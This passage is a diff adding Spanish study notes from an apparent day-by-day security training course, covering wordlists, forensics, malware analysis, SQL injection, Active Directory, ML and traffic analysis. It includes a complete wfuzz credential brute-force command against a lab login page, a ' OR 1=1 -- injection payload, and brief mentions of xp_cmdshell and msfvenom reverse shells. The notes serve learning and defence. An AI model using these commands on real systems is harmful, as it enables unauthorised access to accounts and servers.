+      <node name="day 4" unique_id="203" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701717456" ts_lastsave="1701743932">
+        <rich_text>Objetivos
+- que es CeWL
+- cuales son las capacidades de CeWL
+- como se crean listas de palabras usando CeWL
+- como se puede configurar la salida para ciertas tareas
+
+Se pronuncia cool, es un generador de listas de palabras
+esta herramienta crea la lista basandose en spiders websites
+obtiene la estructura, contenido y otros detalles relevantes
+tambien puede crear una lista de email o usuarios para identificar a los miembros del equipo
+
+how to use cewl
+- usar -h para obtener las opciones
+- para generar una lista basica de un sitio web: `cewl </rich_text>
+        <rich_text link="webs http://MACHINE_IP`">http://MACHINE_IP`</rich_text>
+        <rich_text>
+- para salvar la lista de palabras: `cewl </rich_text>
+        <rich_text link="webs http://MACHINE_IP">http://MACHINE_IP</rich_text>
+        <rich_text> -w output.txt`
+
+Por que CeWL
+- es un generador de palabras unico comparado a otras herramientas
+- esto debido a que en vez de usar un diccionario de palabras hace uso del contenido de la pagina web
+- algunas opciones:
+   → lista especifica para el target
+   → profundidad de busqueda, este se puede configurar, pero tambien se pueden usar otras paginas
+   → Salida customizable
+   → tiene enumeracion de usuarios y extraccion de emails usando la meta tags
+   → Eficiencia
+   → integracion con otras herramientas, este puede ser integrado con pipelines
+   → activamente en mantenimiento
+- la profundidad especifica se puede usar mediante -d
+- el maximo y minimo de caracteres se especifica con -m y -w
+- manejo de autenticacion, se puede usar -a
+- extensiones custom: con --with-numbers se pueden agregar numeros a las palabras, con --extension permite agregar extensiones a cada palabra
+- seguir links externos, usando --offsite, permite hacerlo
+- uso de Wfuzz nos va a servir para hacer el ataque de fuerza bruta, sirve para crear diferentes tipos de inyecciones (SQL, XSS, LDAP)
+- para usar wfuzz: wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credencials" -u </rich_text>
+        <rich_text link="webs http://10.10.55.167/login.php">http://10.10.55.167/login.php</rich_text>
+        <rich_text> -d "username=FUZZ&amp;password=FUZ2Z"</rich_text>
+      </node>
+      <node name="day 5" unique_id="204" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701802128" ts_lastsave="1701812179">
+        <rich_text>Objetivo:
+- como navegar en un sistema legacy no conocido
+- aprender sobre DOS y su conexion con el prompt de comandos de windows
+- descubrir el significado de firma de archivos en recuperacion de archivos y analisis de sistemas
+
+Overview
+- Dos fue un sistema dominante durante los primeros años de las computadoras personales
+- microsoft lo tomo y renombro MS-DOS
+- fue la version inicial de windows
+- los principios de manejo de archivos, estructura de directorios y sintaxis de comandos vienen desde DOS hasta Windows
+
+Comandos
+- CD, cambio de directorio
+- DIR, como ls
+- TYPE, como un cat
+- CLS, como reset
+- HELP, como man
+- EDIT, como nano
+
+FILE SIGNATURE
+- uso de magic bytes, es una secuencia al inicio de los archivos que identifica o verifica el tipo de contenido y formato
+- esto es de gran ayuda en el analisis forence, por medio de este se puede identificar archivos maliciosos</rich_text>
+      </node>
+      <node name="day 6" unique_id="205" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701898509" ts_lastsave="1701898549">
+        <rich_text>Memories of Christmas Past
+
+Objetivos:
+- entender como ciertos lenguajes no manejan memoria segura
+- entender como las variables pueden causar overflow dentro de la memoria y corromperla
+- explotar un buffer simple para directamente cambiar la memoria que en teoria no se tiene acceso
+
+A - 41
+b - 42
+c - 43
+d - 44
+e - 45
+f - 46
+g - 47
+h - 48
+i - 49
+j - 4a
+k - 4b
+l - 4c
+m - 4d
+n - 4e
+o - 4f
+p - 50
+q - 51
+r - 52
+s - 53</rich_text>
+      </node>
+      <node name="day 7" unique_id="206" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701996985" ts_lastsave="1701996991">
+        <rich_text>LOG ANALYSIS
+
+Objetivos:
+- revisar archivos logs y su importancia
+- entender que es un proxy y bajar el contenido de proxy log
+- crear CLI linux para parsear log solo manualmente
+- analizar un proxy log en casos tipicos
+
+Primer log
+- que pasa tras escenas en una computadora o una aplicacion de software
+- este guarda eventos, acciones, errores o informacion de que paso
+- sirve para diagnosticar problemas, monitorear performance y guarda que se esta haciendo
+
+Que es un proxy server?
+- intermedio entre la computadora o dispositivo con el internet
+- cuando se pide informacion o acceso a una pagina web, el dispositivo se conecta a un servidor proxy que se conecta al servidor necesario
+- son usados para saber que usuarios acceden, cuando y que tanto ancho de banda se usa
+- permite crear politicas y bloquear especificos sitios web o ciertas categorias
+
+
+org:
+- ts
+- source ip
+- domain:port
+- http method
+- http uri
+- status code
+- response size
+- user agent</rich_text>
+      </node>
+      <node name="day 8" unique_id="207" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702054338" ts_lastsave="1702056924">
+        <rich_text>Disk Forensics
+
+Objectives
+- use of FTK Imager
+- Analyse digital artefacts and evidence
+- Recover daleted digital artefacts and evidence
+- verify the integrity of a drive/image used as evidence
+
+Tool of only mount usb drive in read-only mode
+
+FTK Imager
+- has UI
+   → tree pane, view of added evidence source as hdd, flash drive and forensic image
+   → List pane, list of files and folders contained in the selected directory
+   → viewer pane, content of selected files in either the evidence
+- preview modes
+   → automatic mode, optimal preview, use IE for web-related files, display text files, and opens unrecognised file types in their navice applications or as hexadecimal code
+   → text mode, allow view fiels as ASCII or unicode text
+   → Hex mode, display files in hexadecimal format
+   → is possible use Ctrl + F to search specific text
+- recovering deleted files and folders
+   → expand direcrtories in file list pane and evidence tree pane, right click and select export files
+- verify drive/image integrity
+   → to check integrity click in Evidence Tree pane and navigate to File &gt; Verify Drive/Image</rich_text>
+      </node>
+      <node name="day 9" unique_id="209" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702164374" ts_lastsave="1702176817">
+        <rich_text>She sells C# shells by the C2Shore
+
+Objetivos:
+- fundamentos para el analisis malware de forma segura
+- los fudamentos de binarios .NET
+- la herramienta dnSpy para descompilar malware escrito en .NET
+- Crear una metodologia esencial para el analisis de malware
+
+Manejo de malware 101
+--- CUIDADO: el manejo de malware es peligroso, siempre tome cuidado con el analisis
+- software diseñado especificamente para causar daño
+- hacer uso de un sandbox, para parecer a una real, este sirve para aislay y que no afecte algo mas
+- el setup para un sandbox contiene:
+   → control de red: para limitar y monitorear el trafico de la red, este previene la propagacion del malware en otros lados
+   → virtualizacion: uso de VMware, VirtualBox o Hyper-V para tener un mejor control e isolado
+   → monitoreo y logging: guardado de logs, del malware, interaccion de sistemas, trafico de la red y modificacion de archivos
+
+Introduccion a binarios compilados .NET
+- binarios escritos en C#, VB.NET, F# o C++
+- estos se ejecutan con un .exe o una librearia dinamica (dll)
+- en .NET o C# se hace uso de un lenguaje intermedio, algo como un pseudocodigo y es traladado dentro de codigo maquina usando el entorno CRL
+- es mas facil decompilar un binario en C# que en C/C++ ya que C# tse puede obtener del lenguaje intermedio
+
+C2 primer
+- command and control, centralizacion o infraestructura que un malicioso actor usa remotamente para manegar y comprometer los dispositivos o sistemas
+- este se ejecuta dentro de la maquina de la victima, una vez ejecutado, el atacante accedera al sistema
+- existen diferentes tipos, estos son:
+   → HTTP requests: se hace uso de HTTP(s), estos pueden enviar y recibir data
+   → Command execution: es el mas comun, permite a los atacantes ejecutar comandos dentro de la maquina
+   → Sleep or delay: para evadir detecciones y mantener el sigilo, se deja el malware desactivo o dormido por un periodo especifico, este se activa solo cuando se activa pasando cierto tiempo
+
+Descompilando Malware con dnSpy
+- es open source assembly, debbuger y editor
+- es usado para ingenieria inversa
+- es user-friendly</rich_text>
+      </node>
+      <node name="day 10" unique_id="210" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702260967" ts_lastsave="1702261003">
+        <rich_text>Sql Injection, Inject the halls with EXEC Queries
+
+Objetivos:
+- aprender como entender e identificar injecciones vulnerables de SQL
+- explorar que consultas SQL pueden servir para ejecucion remota de codigo
+
+SQL
+- usado para trabajar con bases de datos relacionales y crear sitios web dinamicos
+- las bases de datos estructuradas que guardar las colecciones dentro de tablas, cada una consistente de varias filas y columnas,
+- estas tablas tienen relacion facilitando eficientemente la organizacion de los datos
+
+PHP
+- popular lenguaje de scripting que toma un rol muy importante en el desarrollo web
+- permite crear sitios web dinamicos e interactivos
+- este genera el HTML desde el servidor
+- tiene una muy buena integracion con bases de datos de SQL
+- es un lenguaje de scripting del lado de servidor
+- la conexion se hace generalmente por PDO (PHP Data Objects), con librerias como MySQLi o sqlsrv
+
+User Input
+- lo importante de todo esto es la entrada de los usuarios para obtener resultados
+- lo mas comun es usar parametros tipo GET
+
+SQLi (SQL Injection)
+- vulnerabilidades que se pueden dar por medio del contenido dinamico
+- es el uso de ataques que explotan las entradas de usuario usando consutlas SQL
+- es un riesgo ya que puede tener accesos no autorizados, manipulacion de datos, o comprometer una aplicacion web 
+- para evitar esto debe de tener una apropiada validacion y sanitizacion
+- uno de los tantos es: ' OR 1=1 --
+
+OR 1=1
+- es tipicamente usado para evitar la autenticacion o regresar todos los items en una tabla haciendo siempre verdadera la condicion
+
+Stacked Queries
+- estos vienen en varias formas
+- es cuando un atacante quiere tomar control
+- es una inyeccion donde se acaba la consulta original y ejecutar mas inyecciones
+- por medio de el semicolon, esto permite ejecutar multiples sql dentro de una misma interaccion
+
+- xp_cmdshell, es usado para ejecutar comandos de sistema desde sql
+
+REMOTE CODE EXECUTION
+- uso de certutil.exe
+- creacion de payloads usando MSFVenom, permitiendonos usar un shell reverso
+
+Protegerse contra ataques:
+- validacion de entradas
+- parametrizacion de queries que interactuan con la base de datos
+- store procedures, encapsulamiento de logica en procedimientos lo mas posible</rich_text>
+      </node>
+      <node name="day 11" unique_id="211" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702322380" ts_lastsave="1702324850">
+        <rich_text>Active Directory, Jingle bells, shadow spells
+
+Objetivos:
+- entendender active directory
+- introduccion a windows para negocios
+- prerequisitos para explotar privilegios de escritura genericos
+- como atacan las credenciales sombra
+- como explotar vulnerabilidades
+
+Active Directory 101
+- sistema usado principalmente por windows
+- sistema centralizado de autenticacion
+- este maneja guardado de datos, autenticacion y autorizacion
+
+Password are hard to remember - say hello to WHfB
+- Windows Hello for Business es un moderno y segura manera para reemplzar autenticacion basada en password
+- a este se accede mediante Active Directory usando un PIN o biometricos conectados a un par de llaves publcia y privada
+- procedimiento para guardar un par de certificados:
+   → Trusted Platform Module public-private pair generator
+   → peticion de certificado de cliente, uso de un certificado de autoridad (CA) recive y provee un certificado valido
+   → se guarda la llave
+- Proceso de autenticacion:
+   → Autorizacion: el dominio descifra la preautenticacion del cleinte usando la llave publica
+   → Generacion de certificado: este es creado por el controlador de dominio y es enviado de regreso al cliente
+   → Autenticacion: despues el cliente puede acceder usando el certificado
+
+Enumeracion
+- por falta de configuracion apropiadas
+- primero checar permisos vulnerables de acuerdo al usuario
+
+Explotacion
+- una herramienta para abusar de la vulnerabilidad es Whisker
+- esta escrita en C# 
+- se hace uso del protocolo kerberos
+- Rubeus, es un toolset echo en C# para intereccion directa con kerberos</rich_text>
+      </node>
+      <node name="day 12" unique_id="212" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702398614" ts_lastsave="1702398618">
+        <rich_text>Defense in Depth
+
+- Defensa en profundidad
+- Hardening basico de endpoints
+- metodologia Simple Boot2Root
+
+Camino guiado de la cadena de ataque
+- servidor vulnerable por diseño
+- contiene falta de configuracion que han sido pobremente o simplemente no existen
+
+Guide for hardening
+- removal user from sudo group: sudo deluser {user} {group}
+- check: sudo -l -U {user}
+
+Hardening SSH
+- busqueda de escalamiento de privilegios
+- disabled password-based SSH
+
+Stronger password policies
+- password is weak susceptible to a bruteforce
+- bad password practices
+
+Promoviendo cero confianza (zero trust)
+</rich_text>
+      </node>
+      <node name="day 13" unique_id="213" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702514972" ts_lastsave="1702534176">
+        <rich_text>Deteccion de intrusis, to the post, through the walls
+
+Objetivos
+- aprender como se conoce un analisis atravez del modelo diamante
+- identificar estrategias de defensa que pueden ser aplicadas al modelo diamante
+- aprender como configurar reglas de firewall y tener un honeypot como estrategia defensiva
+
+Introduccion
+- deteccion y prevension de intrusos, es el compenente critico de la ciberseguridad
+
+Analisis de incidente
+- es necesario un framework para profilar al atacante, entender sus movimiento y ayudarnos a fortalecer nuestras defensas
+- es un framework de analisis de seguridad para desenmascarar las operaciones del adversario e identificar los elementos usados para la intrusion
+- tiene 4 facetas, interconectadas en forma de buena orquestacion:
+   → adversario
+   → victima
+   → infraestrcutura
+   → capacidad
+
+Adversario
+- peuden ser un solo operador o una organizacion entera
+
+Victima
+- el objetivo del atacante
+
+Infraestructura:
+- conecciones logicas y fisicas que uso el adversario
+
+Capacidad
+- que skills, herramientas o tecnicas se usaron
+   → Phishing: uso de mensajes o correos para obtener la infrmacion
+   → Explotar vulnerabilidades:se explotan vulnerabilidades en software, sistemas y redes
+   → Ingenieria social: manipulacion psicologica para obtener acceso
+   → ataques de malware:deploy de softwre malicioso, como virus, 
+   → amenaza interna: individous dentro de la organizacion quien han hecho mal uso y comprometieron los sistemas
+   → ataques DoS: exceso de trafico o peticiones
+
+Modelo defensivo de diamante
+- uso de capacidad e infraestructura para defenderse
+- Capacidades
+   → the best defensive is ofensive
+   → two main elements:
+      ⇒ Caza de amenezas: proactive e iterativo proceso, bsuqueda de actividad maliciosa o debilidades en seguridad
+      ⇒ manejo de vulnerabilidades: procesos de indentificar, evaluacion, priorizacion, mitigazion y monitoreo de vulnerabilidades
+- Infraestructura
+   → tools to repel cyber-attreset
+   → Firewall
+      ⇒ guardian de redes y sentinela de la ciber seguridad
+      ⇒ is software or hardware or both
+      ⇒ stateless/packet filter: inspecciona y filtra paquetes individuales, basado en un set de reglas, teniendo en cuenta origen y destino de la ip, direccion, puertos y protocolos
+      ⇒ stateful inspection: mas sofisticado, usado para seguir el estado de la red y por medio de este hacer filtracion
+      ⇒ serivio proxy: protege la red filtrando mensajes en la capa de aplicacion, proveyendo una profunda y mas granular inspeccion
+      ⇒ web application firewall (WAF): protege applicaciones web, se usa para sql injection, cross-site scripting  y DOS
+      ⇒ siguiente generacion de firewall: combina stateless, stateful y proxy para la deteccion de intrusos, prevencion y filtrado de contenido
+
+Comandos de configuracion
+- sudo ufw status
+
+HoneyPot
+- es un mecanismo que se presenta como confiable para ser el objetivo del atacante
+- vienen en varios formatos, software, aplicaciones, servidores o redes enteras
+- hay dos tipos:
+   → de baja interaccion, son simples sistemas como servidores y bases de datos, ellos activan cuando son atacadas, sirven para detectar nuevas tecnicas
+   → de alta interaccion, emulan sistemas complejos como sistemas operativos y redes</rich_text>
+      </node>
+      <node name="day 14" unique_id="214" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702592748" ts_lastsave="1702596000">
+        <rich_text>ML, the little machine that wanted to learn
+
+Objectivos:
+- que es machine learning?
+- estructuras y algoritmos basicos de machine learning
+- usando redes neuronales para hacer predicciones
+
+Introduccion
+- creacion de una red neuronal
+
+De 0 a heroe en IA
+- un mejor termino es machine learning
+- es un sistema que imita el ambiente que vemos en la vida real
+- ejemplos:
+   → genetic algorithm: imitan el proceso de seleccion natural y evolucion, “el hijo mas fuerte” y “superviviencia del mas adaptado”
+   → particle swarm: imita a las aves que vuelan juntas a un punto especifico, este busca la respuesta optima por medio de varias particulas
+   → neural networks: este imita a las neuronas del cerebro para resolver el problema
+
+Estilos de aprendizaje
+- aprendizaje supervisado, en este se da la entrada con la que la IA se va a ir guiando para darnos resultados con nuevos datos
+- aprendizaje no supervisado, aqui no se tiene una etiqueta, la IA aprende de acuerdo a los datos que se le han dado para ir sacando conclusiones
+
+Estructura basica:
+- capa de entrada, es la capa donde se ponen los datos, el numero de nodos de entrada sera igual al numero de variables
+- capa de salida, esta es la que da el resultado final que se esta buscando, el numero de salidas es igual al numero de posibles valores esperados
+- capas intermedias, en estas capas se hace el procesamiento, pueden ser varias de estas para el procesado de los datos
+- inputs no son directamente sumadas: cada entrada es multiplicada por un valor para enviarse a la siguiente capa
+- la usma de las salidas no es directamente obtenida, la salida es primero pasada por una funcion de activacion, esta salida generalmente esta entre 0 y 1 o -1 y 1
+- existen dos pasos para entrenar la red neuronal, feed-forward step y back-propagation step
+
+Feed-Forward loop
+- es como se envia la informacion a travez de la red y se obtiene la respuesta de otro lado, una vez entrenada este es el unico paso que necesitamos mejorar
+- se siguen los siguientes pasos:
+   → normalizar todas las entradas, todas las entradas deben de estar en el mismo rango de valores, para tomar la mejor decision
+   → alimentar las entradas a los nodos desde la capa de entrada, se pueden dar los datos en la red
+   → propagar la data a travez de la red, en cada nodo se suman todas las entradas y corren a travez de la red, esto se repite hasta la salida de la red
+   → leer la salida desde la red, aqui se reciben los datos de salida desde los nodos, la respuesta esta ente 0 y 1, pero aqui se debe de hacer una salida binaria
+
+Back-Propagation
+- meintras que feed-forward es solo la mitad del camino, se requiere saber cual es la respuesta correcta
+- calcular la diferencia entre las salidas recibidas y las esperadas, se calcula lo obtenido y se compara con lo que se estaba buscando, por medio de este valor se recalcula para hacer mas precisa la red
+- actualizar los pesos de los nodos, una vez obtenidos los cambios se actualizan los pesos de las demas capas
+- propagar las diferencias de regreso a las otras capas, una vez obtenido los cambios se checa con los demas nodos para hacer los cambios necesarios, este proceso se repite varias veces hasta tener resultados optimos
+
+Dataset Splits
+- para poder entrenar la red se dividen los datos para ver que realmente no tenga sobreentrenamiento
+- se divide generalmente en 3 partes: training data (datos para entrener la red, es del 70 al 80% de los datos), validation data (este se usa para validar el entrenamiento, este es entre 10 a 15%) y testing data (se calcula el performance final de la red, este es entre el 10 al 15%)</rich_text>
+      </node>
+      <node name="day 15" unique_id="215" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702694415" ts_lastsave="1702697404">
+        <rich_text>Machine Learning, jingle bells SPAM: ML saves the day
+
+Se desea crear un detector de spam usando machine learning
+
+Objetivos:
+- diferentes pasos en un pipeline de generico ML
+- ML para clasificacion y entrenamiento de modelos
+- como partir un dataset para entrenar y probar
+- como preparar el modelo de ML
+- como evaluar la eficiencia del modelo
+
+Explorando el pipeline de ML
+- es una serie de pasos envueltos en crear y desplegar un modelo de ML
+- un tipico pipeline incluye:
+   → ingestion
+   → limpieza
+   → preprocesamiento
+   → modelado
+   → desplegado
+- Collection de datos
+   → es el proceso de recuperar data cruda desde varias fuentes para ser usadas por el ML.
+   → esta puede venir de diferentes partes, como bases de datos, archivos de texto, APIs, repositorios online, sensores, sobrevivientes, scrapeo de webs y otros
+   → se hace una revision de los datos obtenidos
+- Procesado de datos
+   → Limpieza, corregir errores, llenar valores perdidos, quitar ruido, y manejar outliers
+   → normalizacion, se escalan los datos numericos dentro de un rango uniforme, tipicamente [0, 1] y [-1, 1]
+   → estandarizacion, reescalar la data para tener una media de - y una desviacion estandar de 1
+   → extraccion de variables, transformacion de datos como texto o imagenes en valores numericos
+   → reduccion de dimensiones, reducir el numero de variables bajo consideracion de obtener un set de variables principales
+   → discretizacion, transformar variables continuas dentro de discretas
+   → procesamiento de texto, crear tokens, steamming, lemmatization, convertir el texto a un formato usable para ML
+   → imputacion, reemplazar valores perdidos con valores estadisticos
+   → ingenieria de variables, creacion de nuevas variables o modificar las existentes para mejorarlas
+- entrenamiento y test, partiendo del dataset
+   → es importante este paso ya que con el podemos probar que el modelo sea indicado y tenga buen performance
+- entrenamiento del modelo
+   → se tienen diferentes formas de entrenar un modelo, los mas comunmente usados para texto son:
+      ⇒ naive bayes, modelo probabilistico basdo en el teoream de bayes
+      ⇒ SVM, es un clasificador robusto, que busca el hiperplano optimo para separar diferentes clases, hace uso de funciones kernel no lineales y de alta dimensionalidad
+      ⇒ regresion logistica, hace uso de la funcion de regresion logistica, este es usado para modelos binarios
+      ⇒ arboles de decision, un modelo que usa un arbol tipo grafo, donde se pueden poner sus posibles soluciones
+      ⇒ random forest, es un conjuncion de multiples arboles de decision
+      ⇒ Gradient Boosting Machines, un conjunto de aprendizajes, para crear fuertes predicciones
+      ⇒ K-Nearest Neighbors (KNN), es un modelo no parametrico que clasifica cada punto basdo en el mayor numero de votos cercanos de sus vecinos
+- Entrenamiento con Naive Bayes
+   → se tiene varios mails etiquetados como spam y ham
+   → el modelo aprende de estos datos, se checa con que frecuencia aparecen las palabras de acuerdo a su etiquetado
+   → este calcula la probnabilidad de que el email sea o no spam de acuerdo al numero de palabras
+- Evaluacion del modelo
+   → despues de entrenar el modelo es necesario evaluarlo, este se puede checar si accuracy, precision y recall
+   → Precision, que tantos predicciones positivas hizo
+   → Sencibilidad (recall), cual de todos los ejemplos positivos han sido acertados
+   → F1-Score, la media harmonicade la precision y recall, cuales fueron clasificados incorrectamente
+   → Soporte, numero de ocurrencias actuales de la clase en el dataset especifico
+   → Exactitud, el total de observaciones correctamente predictas
+   → Promedio macro, este promedia los pesos por etiqueta
+   → Promedio de pesos, promedia los pesos soportados por cada etiqueta
+- Testeando el modelo
+   → una vez obtenidos resultados se puede probar con mas datos, nuevos</rich_text>
+      </node>
+      <node name="day 16" unique_id="216" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702764741" ts_lastsave="1702777585">
+        <rich_text>ML, can't captcha this machine
+
+Objetivos:
+- estructuras complejas de redes neuronales
+- como funciona una red neuronal convexa
+- usando redes neuronales para reconocimiento de caracteres
+- integrando redes neuronales dentro de las herramientas del red team
+
+Introduccion
+- ver como los read team pueden usar ML
+
+Convolutional Neural Networks (CNN)
+- tienen la habilidad de extraer variables que pueden ser usadas para entrenar redes neuronales
+- en estas se tiene una extraccion de variables como parte de la red
+- aqui se usa algebra lineal
+- Se pueden dividir en tres componentes principales:
+   → Extraccion de variables
+   → Capas completamente conectadas
+   → Clasificacion
+
+Extraccion de variables
+- son usadas para clasificar imagenes
+- se usan para romper CAPTCHAs
+- Representacion de imagenes
+   → la computadora precive las imagenes como arreglos 2D de pixeles
+   → un valor de pixel describe que color puede verse, hay dos valores
+      ⇒ RGB: este se representa por 3 numeros del 0 al 255, describe la intensidad del Rojo, Azul y Verde
+      ⇒ Greyscale: se representa por un numero del 0 al 255, donde 0 es completamente negro y 255 blanco
+- Convolution
+   → se reduce el tamaño de la entrada
+   → se tienen miles de pixeles, por lo cual se necesita reducir haciendo sumarizacion de la imagen
+   → para esto la matriz se mueve sobre toda la imagen, calculandolo
+- Pooling
+   → en este se puede aplicar un metodo estadistico
+- Capas completamente conectadas
+   → aqu trabaja como las demas redes neuronales, aqui todos los nodos son reconectados entre ellos
+</rich_text>
+      </node>
+      <node name="day 17" unique_id="217" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702852543" ts_lastsave="1702870166">
+        <rich_text>Traffic Analysis, I tawt I taw a c2 tat
+
+Objetivos
+- ganar conocimiento del formato del trafico de red
+- entender las diferencias entre captura de full package y flujos de red
+- aprender como procesar los flujos de datos de red
+- conocer y usar la herramienta SiLK para el analisis de flujo de red
+
+Network Traffic Data
+- </rich_text>
+        <rich_text style="italic">The network data is everywhere. It is all around us. Even now in this very task.</rich_text>
+        <rich_text>
+- esta ayuda a un manejo de red, resolucion de problemas, respuesta a incidentes y caceria de amenazas
+- Network manager
+   → monitoreo de performance
+   → identificar cuellos de botella
+   → asegurar la asignacion y calidad de servicios
+- resolucion de problemas
+   → identificar problemas de red
+   → validar configuraciones, implementaciones y cambios
+   → y configurar las lineas basicas de desempeño
+- respuesta de incidentes
+   → alcance del incidente
+   → analisis de causa raiz
+   → evaluacion de incidentes del dia dia
+- caceria de amenzas
+   → analisis proactivo para patrones maliciosos y sospechosos
+- estos vienen en varios formatos, PCAP (Packet capture)
+   → proveen un granular, crudo y comprensiva vista del trafico de red
+   → provee todos los datos posibles representados por paquetes
+- estos requieren guardarse, procesar y capacidades de analisis
+- network flow data es una alternativa ligera a los PCAP's, uso de formato netflow
+
+Mirada cerrada a PCAPs y flujos
+- Comparacion:
+   → Model
+      ⇒ PCAP, captura de paquetes
+      ⇒ Network Flow, Registros de flujos de protocolo
+   → Profundidad de la informacion
+      ⇒ PCAP, datos granulados detalladamente, contiene los datelles y payload
+      ⇒ Network Flow, resumen de la data, no contiene detalles ni payload
+   → Proposito general
+      ⇒ PCAP, analisis profundo de paquetes
+      ⇒ Network Flow, resumen del flujo de paquetes
+   → Pros
+      ⇒ PCAP, provee alta visibilidad de los paquetes
+      ⇒ Network Flow, provee un resumen muy alto
+   → Cons
+      ⇒ PCAP, duro de procesar y requiere tiempo y recursos para ser analizado, la encriptacion es un obstaculo
+      ⇒ Network Flow, resumen solamente, no payload
+   → Campos disponibles
+      ⇒ PCAP, capas de cabeceras y de payload
+      ⇒ Network Flow, metadata de paquetes
+
+Como colectar y procesar data de red
+- se hace uso de monitoreo y analisis de la red (wireshark, tshark y tcpdump)
+
+Recomendaciones y exploracion de herramientas
+- hacer uso de SiLK, este contiene varias herramientas y binarios para coleccionar, parsear, filtrar y analizar el trafico de red
+- este puede procesar directamente desde flujos, PCAPs y binary flow data
+
+SiLK
+- tiene dos partes
+   → el sistema de paquetes, collecion de multiples flujos de red (IPFIX, NetfFow v9 y NetFlow v5)
+   → la suite de analisis, contienen herramientas que pueden usarse para varias operaciones (list, sort, count y statistics)</rich_text>
+      </node>
+      <node name="day 18" unique_id="218" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702920046" ts_lastsave="1702921375">
+        <rich_text>Eradication, A gift that keeps on giving
+
+Objetivos
+- identificar el uso de cpu y memoria en procesos de linux
+- matar innecesarios procesos en linux
+- buscar caminos que puedan persistir mas alla d ela terminacion
+- remove procesos que son permanentemente procesando
+
+Identificando los procesos
+- manejo de procesos usando top
+
+Chequeo de crons si kill mata el proceso y vuelve a parecer, crontab -l
+Para revisar los servicios corriendo: systemctl list-unit-files</rich_text>
+      </node>
+      <node name="day 19" unique_id="219" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703024981" ts_lastsave="1703028384">
+        <rich_text>Memory forensic, CrypTOYminers Sing volala-lala-lality
+
+Memory dumps
+
+Objectivos:
+- entender que es memory forensics y como usarlo para investigaciones forenses digitales
+- entender que es la data volatil y como volcarla
+- aprender sobre volatibilidady como se puede hacer un analisis de volvado de memoria
+- aprender sobre perfiles volatiles
+
+Forensic Memory
+- tambien conocida como memoria volatil o RAM
+- rama del forense digital
+- este involucra la examinacion y analisis de la RAM
+- este difiere del analisis forense de disco, donde todos los archivos pueden ser recuperados y estudiados
+- este se enfoca en los programas que estan corriendo cuando el dump fue creado
+- este es volatil por que una vez apagada la compu esta memoria se borra
+
+Data volatil
+- informacion que esta temporalmente guardada en la RAM
+- puede ser facilmente perdida o alterada
+- ejemplos: procesos corriendo, coneccion de red y contenido de RAM
+
+Memory dump
+- snapshot de la memoria que ha sido capturado para hacer un analisis
+
+Beneficios
+- se encuentra la data en tiempo real
+- es rapido ver actividades, detecta amenas cautelosas, datos volatiles como contraseñás y permite a los investigadores para entender actividades de los usuarios y estado de los sistemas durante memoria volatil
+- en el disco duro se consume mas tiempo, ya que estos pueden tener miles de Gigabytes en tamaño
+
+Que son los procesos
+- independiente y autocontenida unidad de ejecucion dentro de un sistema operativo
+- consiste de su propio codigo de programa, data, espacio en memoria y recursos del sistema
+- existen dos tipos:
+   → Procesos de usuario, estos son los que el usuario empezo, interactuan con el usuario
+   → Procesos de fondo, estos operan sin interaccion con el usuario
+
+Volatibility
+- es un CLI que permite a analizar un dump en orden de analisis de performance
+- esta escrito en python, se puede usar para:
+   → listar y cerrar conecciones de red
+   → listar un dispositivo corriendo procesos al mismo tiempo de la captura
+   → listar posibles comandos en linea 
+   → extraer posibles procesos malicioso
+
+Profiles
+- en este se define la arquitectura del SO, version y varias especificaciones de la memoria
+- es crucial usar el profile apropiado, ya que cada uno tiene diferentes capas de memoria y estructuras de datos
+- los profiles para linux deben crearse manualmente:
+   → no es uno solo, sistema operativo monolitico, tiene diferentes distribuciones y configuraciones
+   → depende de la version del kernel, configuraciones y capas de memoria
+   → win tiene una estructura de memoria mas estandarizada y API del sistema
+   → tambien tiene que ver que es un sistema de codigo abierto lo que hace que pueda tener variaciones
+
+Plugins
+- history file: vol.py -f {file} --profile={profile} linux_bash
+- running process: vol.py -f {file} --profile={profile} linux_pslist
+- process extraction: vol.py -f {file} --profile={profile} linux_procdump -D extracted
+- file extraction: vol.py -f {file} --profile={profile} linux_enumerate_files</rich_text>
+      </node>
+      <node name="day 20" unique_id="220" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1703092856" ts_lastsave="1703097089">
+        <rich_text>DevSecOps, advent of frostlings
+
